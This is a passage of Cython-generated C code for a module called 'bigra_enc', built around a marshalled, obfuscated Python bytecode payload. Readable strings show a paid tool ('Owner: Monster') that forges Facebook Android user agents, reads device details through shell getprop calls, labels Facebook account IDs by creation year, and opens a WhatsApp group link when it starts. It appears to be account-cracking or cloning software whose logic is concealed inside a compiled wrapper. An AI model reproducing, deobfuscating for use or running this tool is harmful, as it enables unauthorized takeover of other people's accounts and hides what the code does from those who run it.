#ifdef PyExceptionInstance_Check
  #define __Pyx_PyBaseException_Check(obj) PyExceptionInstance_Check(obj)
#else
  #define __Pyx_PyBaseException_Check(obj) __Pyx_TypeCheck(obj, PyExc_BaseException)
#endif

/* GetRuntimeVersion.proto */
static unsigned long __Pyx_get_runtime_version(void);

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer);

/* MultiPhaseInitModuleState.proto */
#if CYTHON_PEP489_MULTI_PHASE_INIT && CYTHON_USE_MODULE_STATE
static PyObject *__Pyx_State_FindModule(void*);
static int __Pyx_State_AddModule(PyObject* module, void*);
static int __Pyx_State_RemoveModule(void*);
#elif CYTHON_USE_MODULE_STATE
#define __Pyx_State_FindModule PyState_FindModule
#define __Pyx_State_AddModule PyState_AddModule
#define __Pyx_State_RemoveModule PyState_RemoveModule
#endif

/* #### Code section: module_declarations ### */
/* CythonABIVersion.proto */
#if CYTHON_COMPILING_IN_LIMITED_API
    #if CYTHON_METH_FASTCALL
        #define __PYX_FASTCALL_ABI_SUFFIX  "_fastcall"
    #else
        #define __PYX_FASTCALL_ABI_SUFFIX
    #endif
    #define __PYX_LIMITED_ABI_SUFFIX "limited" __PYX_FASTCALL_ABI_SUFFIX __PYX_AM_SEND_ABI_SUFFIX
#else
    #define __PYX_LIMITED_ABI_SUFFIX
#endif
#if __PYX_HAS_PY_AM_SEND == 1
    #define __PYX_AM_SEND_ABI_SUFFIX
#elif __PYX_HAS_PY_AM_SEND == 2
    #define __PYX_AM_SEND_ABI_SUFFIX "amsendbackport"
#else
    #define __PYX_AM_SEND_ABI_SUFFIX "noamsend"
#endif
#ifndef __PYX_MONITORING_ABI_SUFFIX
    #define __PYX_MONITORING_ABI_SUFFIX
#endif
#if CYTHON_USE_TP_FINALIZE
    #define __PYX_TP_FINALIZE_ABI_SUFFIX
#else
    #define __PYX_TP_FINALIZE_ABI_SUFFIX "nofinalize"
#endif
#if CYTHON_USE_FREELISTS || !defined(__Pyx_AsyncGen_USED)
    #define __PYX_FREELISTS_ABI_SUFFIX
#else
    #define __PYX_FREELISTS_ABI_SUFFIX "nofreelists"
#endif
#define CYTHON_ABI  __PYX_ABI_VERSION __PYX_LIMITED_ABI_SUFFIX __PYX_MONITORING_ABI_SUFFIX __PYX_TP_FINALIZE_ABI_SUFFIX __PYX_FREELISTS_ABI_SUFFIX __PYX_AM_SEND_ABI_SUFFIX
#define __PYX_ABI_MODULE_NAME "_cython_" CYTHON_ABI
#define __PYX_TYPE_MODULE_PREFIX __PYX_ABI_MODULE_NAME "."


/* Module declarations from "bigra_enc" */
/* #### Code section: typeinfo ### */
/* #### Code section: before_global_var ### */
#define __Pyx_MODULE_NAME "bigra_enc"
extern int __pyx_module_is_main_bigra_enc;
int __pyx_module_is_main_bigra_enc = 0;

/* Implementation of "bigra_enc" */
/* #### Code section: global_var ### */
/* #### Code section: string_decls ### */
static const char __pyx_k_[] = "?";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_spec[] = "__spec__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_module[] = "__module__";
static const char __pyx_k_marshal[] = "marshal";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_qualname[] = "__qualname__";
static const char __pyx_k_initializing[] = "_initializing";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l_Z[] = "\343\000\000\000\000\000\000\000\000\000\000\000\000\024\000\000\000\000\000\000\000\363\016\n\000\000\227\000d\000d\001l\000Z\000d\000d\001l\001Z\001d\000d\001l\000Z\000d\000d\001l\002Z\002d\000d\001l\003Z\003d\000d\001l\004Z\004d\000d\001l\005Z\005\002\000e\006d\002\253\001\000\000\000\000\000\000\001\000\002\000e\000j\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\003\253\001\000\000\000\000\000\000\001\000\t\000d\000d\001l\010Z\010d\000d\001l\tZ\td\000d\001l\nZ\nd\000d\001l\013Z\013d\000d\001l\014Z\014d\000d\001l\rZ\rd\000d\001l\005Z\005d\000d\001l\016Z\016d\000d\001l\017Z\017d\000d\004l\013\255\002\001\000d\000d\005l\020m\021Z\022\001\000g\000g\000d\000g\000f\004\\\004\000\000a\025a\026a\027Z\030\002\000e\nj2\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000j4\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\001d\007\032\000j7\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\253\000\000\000\000\000\000\000Z\034d\010\204\000Z\035d\t\204\000Z\036g\000Z\037\002\000e d\n\253\001\000\000\000\000\000\000D\000]\306\000\000Z!d\013Z\"\002\000e\rjF\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d\014\242\001\253\001\000\000\000\000\000\000Z$d\rZ%\002\000e\rjF\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d\016\242\001\253\001\000\000\000\000\000\000Z&\002\000e\rjN\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\017d\020\253\002\000\000\000\000\000\000Z(\002\000e\rjF\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d\016\242\001\253\001\000\000\000\000\000\000Z)d\021Z*\002\000e\rjN\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\022d\023\253\002\000\000\000\000\000\000Z+d\024Z,\002\000e\rjN\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\025d\026\253\002\000\000\000\000\000\000Z-\002""\000e\rjN\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\027d\030\253\002\000\000\000\000\000\000Z.d\031Z/e\"\233\000d\032e$\233\000d\033e%\233\000e&\233\000e(\233\000e)\233\000d\034e*\233\000e+\233\000d\035e,\233\000d\035e-\233\000d\035e.\233\000d\032e/\233\000\235\023Z0e\037jc\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000e0\253\001\000\000\000\000\000\000\001\000\214\310\004\000d\036Z2g\000d\037\242\001Z3d a4\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d!d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z8\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d&d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z9\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d'd\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z:d(Z;\t\000\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d)d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jy\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d*\253\001\000\000\000\000\000\000d\000\031\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z""=\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d,d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z>\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d-d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z?e9Z@e8ZA\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d.d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d*d/\253\002\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000ZBd0\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d1d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000z\000\000\000d2z\000\000\000\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d3d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000z\000\000\000ZC\t\000\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d)""d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jy\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d*\253\001\000\000\000\000\000\000Z=d\000ZDe=D\000]\007\000\000Z,eDd\017z\r\000\000ZD\214\t\004\000d4ZEeEd5k(\000\000rO\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d)d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jy\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d*\253\001\000\000\000\000\000\000d\000\031\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z=th\000\000\000\000\000\000\000\000e=z\r\000\000a4n`eEd6k(\000\000rP\t\000\002\000e\016jj\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d)d\"\254#\253\002\000\000\000\000\000\000jm\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d$\253\001\000\000\000\000\000\000jy\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d*\253\001\000\000\000\000\000\000d\017\031\000\000\000jo\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d%d \253\002\000\000\000\000\000\000Z=th\000\000\000\000\000\000\000\000e=z\r\000\000a4n\013d7Z=th\000\000\000\000\000\000\000\000e=z\r\000\000a4e8e9e:e;e>e?e9eAeBeCd8\234\nZGd9\204\000ZHd:ZId;\204\000ZJd\000a\027g\000a\025g\000a\026g\000ZKg\000ZLd<\204\000ZMd=\204\000ZNd>\204\000ZOd?\204\000ZPd@\204\000ZOdA\204\000ZQ\002\000eQ\253\000\000\000\000\000\000\000\001\000y\001#\000e\023$\000r%\001\000\002\000e\006d\006\253\001\000\000\000\000\000\000\001\000\002\000e\000j\016\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\003\253\001\000\000\000\000\000\000\001\000\002\000e\024\253\000\000\000\000\000\000\000\001\000Y\000\220\004\214lw""\000x\003Y\000w\001#\000\001\000d+Z=Y\000\220\002\214~x\003Y\000w\001#\000eF$\000r\025Z(d+Z=th\000\000\000\000\000\000\000\000e=z\r\000\000a4Y\000d\001Z([(\214\205d\001Z([(w\001w\000x\003Y\000w\001#\000\001\000d+Z=Y\000\214\223x\003Y\000w\001)B\351\000\000\000\000Nz#\033[1;37\033[1m Join our WhatsApp group z9xdg-open https://chat.whatsapp.com/FeUqeXZuiKu3CVaIP9dp0s)\001\332\001*)\001\332\022ThreadPoolExecutorz$ \n\n Module Not installed Correctly! \351\005\000\000\000c\000\000\000\000\000\000\000\000\000\000\000\000\007\000\000\000\003\000\000\000\363\264\001\000\000\227\000t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d\001\242\001\253\001\000\000\000\000\000\000}\000t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d\002\242\001\253\001\000\000\000\000\000\000}\001t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000g\000d\003\242\001\253\001\000\000\000\000\000\000}\002d\004t\005\000\000\000\000\000\000\000\000t\001\000\000\000\000\000\000\000\000j\006\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\005d\006\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000d\007z\000\000\000t\005\000\000\000\000\000\000\000\000t\001\000\000\000\000\000\000\000\000j\010\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\010d\t\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000t\005\000\000\000\000\000\000\000\000t\001\000\000\000\000\000\000\000\000j\006\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\005d\006\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000d\nz\000\000\000t\005\000\000\000\000\000\000\000\000t\001\000\000\000\000\000\000\000\000j\006\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\013d""\014\253\002\000\000\000\000\000\000\253\001\000\000\000\000\000\000z\000\000\000d\rz\000\000\000}\003d\016}\004|\003|\004z\000\000\000}\005|\005S\000)\017N)\t\332\005en_US\332\005en_GB\332\005en_PK\332\005ru_RU\332\005de_DE\332\005th_TH\332\005en_BD\332\005en_IN\332\005en_AF)\003\372\023com.facebook.katana\372\021com.facebook.orca\372\022com.facebook.mlite)\010z\007o2 - dez\014Verizon - usz\tMY CELCOMz\rVodafone - uk\332\004null\332\004DTACz\nIND airtelz\rNepal Telecom\372\020[FBAN/FB4A;FBAV/\351\013\000\000\000\351M\000\000\000\372\005.0.0.\351\t\000\000\000\3511\000\000\000\372\006;FBBV/\351G\364\020\000i\361\255v\000a(\001\000\000;[Davik/2.1.0 (Linux; U; Android 12; Infinix X6817 Build/SP1A.210812.016) [FBAN/MessengerLite;FBAV/308.0.0.3.90;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/521471303;FBCR/Jazz;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6817;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]a\235\002\000\000FBAN/FB4A;FBAV/340.0.0.31.63;FBBV/1397400;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH7991;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]FBAN/FB4A;FBAV/356.0.0.31.63;FBBV/1816189;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH1615;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]FBAN/FB4A;FBAV/479.0.0.31.63;FBBV/5863778;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH7577;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;])\005\332\006random\332\006choice\332\003str\332\007randint\332\trandrange)\006\332\002en\332\002kt\332\004fbcr\332\001s\332\001e\332\002uas\006\000\000\000      \332\001 \332\005BIGR9r)\000\000\000\024\000\000\000s\351\000\000\000\200\000\334\t\017\217\035\211\035\322\027`\323\ta\200B\334\t\017\217\035\211\035\322\027W\323\tX\200B\334\013\021\217=\211=\322\031{\323\013|""\200D\330\010\032\2343\234v\237~\231~\250b\260\022\323\0374\323\0335\321\0105\260g\321\010=\274c\304&\327BR\321BR\320ST\320UW\323BX\323>Y\321\010Y\324Z]\324^d\327^l\321^l\320mo\320pr\323^s\323Zt\321\010t\320v~\321\010~\364\000\000@\002C\002\364\000\000D\002J\002\367\000\000D\002R\002\361\000\000D\002R\002\360\000\000S\002Z\002\360\000\000[\002b\002\363\000\000D\002c\002\363\000\000@\002d\002\361\000\000\td\002\360\000\000e\002O\007\361\000\000\tO\007\200A\360\002\000\tn\n\200A\330\t\n\210Q\211\025\200B\330\013\r\200I\363\000\000\000\000c\000\000\000\000\000\000\000\000\000\000\000\000\n\000\000\000\003\000\000\000\363\310\000\000\000\227\000d\001d\002g\002}\000d\003t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\004d\005\253\002\000\000\000\000\000\000\233\000d\006t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\007d\010\253\002\000\000\000\000\000\000\233\000d\tt\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\nd\013\253\002\000\000\000\000\000\000\233\000d\014t\001\000\000\000\000\000\000\000\000j\004\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000\233\000\235\010}\001|\001S\000)\rNz\357[FBAN/FB4A;FBAV/455.0.0.0.35;[FBAN/FB4A;FBAVFBBV/450004028;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]z\357[FBAN/FB4A;FBAV/463.0.0.0.50;[FBAN/FB4A;FBAVFBBV/451606073;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]r\025\000\000\000r\026\000\000\000\351c\000\000\000r\030\000\000\000iW\004\000\000i\017'\000\000r\033\000\000\000r\034\000\000\000i\226\230\000\332""\001;)\003r\035\000\000\000r \000\000\000r\036\000\000\000)\002\332\r____sexua____\332\n____ua____s\002\000\000\000  r(\000\000\000\332\021____useragent____r0\000\000\000\035\000\000\000s\221\000\000\000\200\000\360\004\000\002s\003\360\002\000\002s\003\360\005\002\022t\003\200\035\360\006\000\021!\244\026\247\036\241\036\260\002\2602\323!6\320 7\260u\274V\277^\271^\310D\320QU\323=V\320<W\320W]\324^d\327^l\321^l\320mt\320u|\323^}\320]~\320~\364\000\000A\002G\002\367\000\000A\002N\002\361\000\000A\002N\002\360\000\000O\002\\\002\363\000\000A\002]\002\360\000\000@\002^\002\360\000\000\017_\002\200\032\330\010\022\320\001\022r*\000\000\000i\350\003\000\000z\034Mozilla/5.0 (Linux; Android;)\007\332\0016\332\0017\332\0018\332\0019\332\00210\332\00211\332\00212z\037en-us; 12; Infinix X6817 Build/)\032\332\001A\332\001B\332\001C\332\001D\332\001E\332\001F\332\001G\332\001H\332\001I\332\001J\332\001K\332\001L\332\001M\332\001N\332\001O\332\001P\332\001Q\332\001R\332\001S\332\001T\332\001U\332\001V\332\001W\332\001X\332\001Y\332\001Z\351\001\000\000\000\351\347\003\000\000zFAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5462.85\351F\000\000\000\351^\000\000\000\332\0010iP\024\000\000i\014\027\000\000\351\036\000\000\000i\"\001\000\000z\024Mobile Safari/537.36r(\000\000\000z\002; z\002) \332\001.)\005z\027com.facebook.adsmanagerz\021com.facebook.liter\021\000\000\000r\020\000\000\000r\022\000\000\000)\225\372\017SM-G920F|NRD90Mz\016SM-T535|LRX22G\372\016SM-T231|KOT49H\372\017SM-J320F|LMY47V\372\017GT-I9190|KOT49H\372\017GT-N7100|KOT49H\372\016SM-T561|KTU84Pr]\000\000\000\372\017GT-I9500|LRX22Cr[\000\000\000\372\017SM-G930F|NRD90Mr[\000\000\000\372\020SM-J510FN|NMF26Xz\017GT-P5100|IML74Kr[\000\000\000\372\017GT-N8000|JZO54K\372\016SM-T531|LRX22Gz\017SPH-L720|KOT49Hz\016GT-I9500|JDQ39\372\017SM-G935F|NRD90Mr^\000\000\000z\016SM-T531|KOT49H\372\020SM-J320FN|LMY47V\372\017SM-A500F|MMB29M\372\020SM-A500FU|MMB29Mrf\000\000\000\372\016SM-T311|KOT49Hrc\000\000\000r[""\000\000\000re\000\000\000r[\000\000\000\372\017GT-P5210|KOT49Hz\016SM-T230|KOT49H\372\017GT-I9192|KOT49Hz\014SM-T235|KOT4r]\000\000\000\372\017SM-A500F|LRX22Grf\000\000\000r]\000\000\000z\017SM-G920F|MMB29Kra\000\000\000rb\000\000\000re\000\000\000re\000\000\000z\017SM-A500H|MMB29M\372\017GT-I9300|JSS15Jr_\000\000\000z\rSM-J320F|LMY4ra\000\000\000rf\000\000\000\372\017GT-N8000|KOT49Hr^\000\000\000z\017SM-G900F|KOT49Hz\017GT-S7390|JZO54Kr[\000\000\000z\017GT-P5100|JZO54Krg\000\000\000r`\000\000\000ra\000\000\000r^\000\000\000rm\000\000\000rc\000\000\000z\020SM-J510FN|MMB29Mra\000\000\000r[\000\000\000z\016GT-P5110|JDQ39\372\020GT-I9301I|KOT49Hrk\000\000\000r`\000\000\000z\014SM-T311|KOT4\372\017GT-P5200|KOT49Hrn\000\000\000z\017SM-J320M|LMY47Vrc\000\000\000\372\016SM-T820|NRD90Mrj\000\000\000z\017SM-G935F|MMB29Kz\020SM-J701F|NRD90M;z\016GT-I9301I|KOT4re\000\000\000z\rSM-T111|JDQ39rf\000\000\000z\016SM-J510FN|NMF2z\016SM-T705|LRX22GrY\000\000\000\372\017GT-N5100|JZO54K\372\020GT-I9300I|KTU84Prr\000\000\000rm\000\000\000rm\000\000\000rf\000\000\000r\\\000\000\000ra\000\000\000r[\000\000\000z\016GT-P5100|JDQ39rr\000\000\000rq\000\000\000rm\000\000\000r_\000\000\000re\000\000\000rf\000\000\000rb\000\000\000\372\016SM-T805|LRX22GrZ\000\000\000rq\000\000\000z\017SM-J320H|LMY47VrZ\000\000\000r`\000\000\000rd\000\000\000z\016SM-T310|KOT49Hrm\000\000\000rr\000\000\000rY\000\000\000ra\000\000\000z\017SM-T705|LRX22G;z\017GT-P3110|JZO54Krj\000\000\000r[\000\000\000rY\000\000\000z\017GT-I9300|IMM76Dz\017SM-G950F|NRD90Mr[\000\000\000\372\021SM-J510FN|NMF26X;z\017SM-J701F|NRD90Mrk\000\000\000rZ\000\000\000rh\000\000\000re\000\000\000ri\000\000\000rs\000\000\000r_\000\000\000ro\000\000\000rn\000\000\000rl\000\000\000r]\000\000\000rc\000\000\000rp\000\000\000z\rSM-T315|JDQ39r[\000\000\000r\\\000\000\000z\016GT-P5220|JDQ39z\016SM-T525|KOT49Hz\016SM-T555|LRX22Gr\\\000\000\000rt\000\000\000rf\000\000\000rj\000\000\000z\014GT-P5100|JDQrh\000\000\000\332\000z getprop ro.build.version.rel""easeT)\001\332\005shellz\005utf-8\332\001\nz\030getprop ro.product.modelz\023getprop ro.build.idr\007\000\000\000z\032getprop gsm.operator.alpha\332\001,\332\006Roshanz\037getprop ro.product.manufacturerz\030getprop ro.product.brandz\036getprop ro.product.cpu.abilist\332\001:z\025{density=2.25,height=z'getprop ro.hwui.text_large_cache_heightz\007,width=z&getprop ro.hwui.text_large_cache_width)\002\332\0011\332\0012r{\000\000\000r|\000\000\000\332\006Roahan)\n\332\017android_version\332\005model\332\005build\332\004fblc\332\004fbmf\332\004fbbd\332\004fbdv\332\004fbsv\332\004fbca\332\004fbdmc\000\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000\003\000\000\000\363L\000\000\000\227\000t\001\000\000\000\000\000\000\000\000j\002\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000d\001\253\001\000\000\000\000\000\000\001\000t\005\000\000\000\000\000\000\000\000t\006\000\000\000\000\000\000\000\000\253\001\000\000\000\000\000\000\001\000y\000)\002N\332\005clear)\004\332\002os\332\006system\332\005print\332\004logo\251\000r*\000\000\000r(\000\000\000r\211\000\000\000r\211\000\000\000g\000\000\000s\025\000\000\000\200\000\334\004\006\207I\201I\210g\324\004\026\334\004\t\214$\205Kr*\000\000\000a\323\001\000\000\033[1;97m\nd8888b. d888888b  d888b  d8888b.  .d8b.  \n88  `8D   `88'   88' Y8b 88  `8D d8' `8b \n88oooY'    88    88      88oobY' 88ooo88 \n88~~~b.    88    88  ooo 88`8b   88~~~88 \n88   8D   .88.   88. ~8~ 88 `88. 88   88 \nY8888P' Y888888P  Y888P  88   YD YP   YP  \n\033[1;37m--------------------------------------------------\n Owner      :  Monster\n Facebook   :  Bigra Mahar \n Version    :  15.3\n Status     :  Paid\n\033[1;37m--------------------------------------------------c\000\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000\003\000\000\000\363\032\000\000\000\227\000t\001\000\000\000\000\000\000\000\000d\001\253\001\000\000\000\000\000\000\001\000y\000)\002Nz@\033[1;37m-----------------------------------------------""---\033[1;33m)\001r\214\000\000\000r\216\000\000\000r*\000\000\000r(\000\000\000\332\004liner\220\000\000\000y\000\000\000s\013\000\000\000\200\000\334\004\t\320\014R\325\004Tr*\000\000\000c\001\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000\003\000\000\000\363:\002\000\000\227\000t\001\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000d\001k(\000\000r\325|\000d\000d\002\032\000d\003v\000r\004d\004}\001|\001S\000|\000d\000d\005\032\000d\006v\000r\004d\007}\001|\001S\000|\000d\000d\010\032\000d\tv\000r\004d\n}\001|\001S\000|\000d\000d\013\032\000d\014v\000r\004d\n}\001|\001S\000|\000d\000d\013\032\000d\rv\000r\004d\016}\001|\001S\000|\000d\000d\017\032\000d\020v\000r\004d\021}\001|\001S\000|\000d\000d\017\032\000d\022v\000r\004d\023}\001|\001S\000|\000d\000d\017\032\000d\024v\000r\004d\025}\001|\001S\000|\000d\000d\017\032\000d\026v\000r\004d\027}\001|\001S\000|\000d\000d\017\032\000d\030v\000r\004d\027}\001|\001S\000|\000d\000d\017\032\000d\031v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d\034v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d\035v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d\036v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d\037v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d!v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d\"v\000r\004d\032}\001|\001S\000|\000d\000d\033\032\000d#v\000r\004d$}\001|\001S\000d%}\001|\001S\000t\001\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000d&v\000r\004d'}\001|\001S\000t\001\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000d\010k(\000\000r\004d(}\001|\001S\000t\001\000\000\000\000\000\000\000\000|\000\253\001\000\000\000\000\000\000d\013k(\000\000r\004d)}\001|\001S\000d%}\001|\001S\000)*N\351\017\000\000\000\351\n\000\000\000)\001\332\n1000000000z\016 (*-*) 2009 OKr\031\000\000\000)\001\332\t100000000z\021 ACCOUNT  2009 OK\351\010\000\000\000)\001\332""\01010000000z\020 ACCOUNT 2009 OK\351\007\000\000\000)\006\332\0071000000\332\0071000001\332\0071000002\332\0071000003\332\0071000004\332\0071000005)\004\332\0071000006\332\0071000007\332\0071000008\332\0071000009z\020 ACCOUNT 2010 OK\351\006\000\000\000)\001\332\006100001z\030 ACCOUNT 2010/2011 OK ID)\002\332\006100002\332\006100003z\030 ACCOUNT 2011/2012 OK ID)\001\332\006100004z\030 ACCOUNT 2012/2013 OK ID)\002\332\006100005\332\006100006z\t ACCOUNT )\002\332\006100007\332\006100008)\001\332\006100009z\007 OK ID r\005\000\000\000)\001\332\00510001)\001\332\00510002)\001\332\00510003)\001\332\00510004)\001\332\00510005)\003\332\00510006\332\00510007ru\000\000\000)\001\332\00510008)\001\332\00510009z\006 OK IDru\000\000\000)\002r\031\000\000\000r\223\000\000\000z\025 ACCOUNT 2008/2009 OKz\025 ACCOUNT 2007/2008 OKz\025 ACCOUNT 2006/2007 OK)\001\332\003len)\002\332\003uid\332\004alifs\002\000\000\000  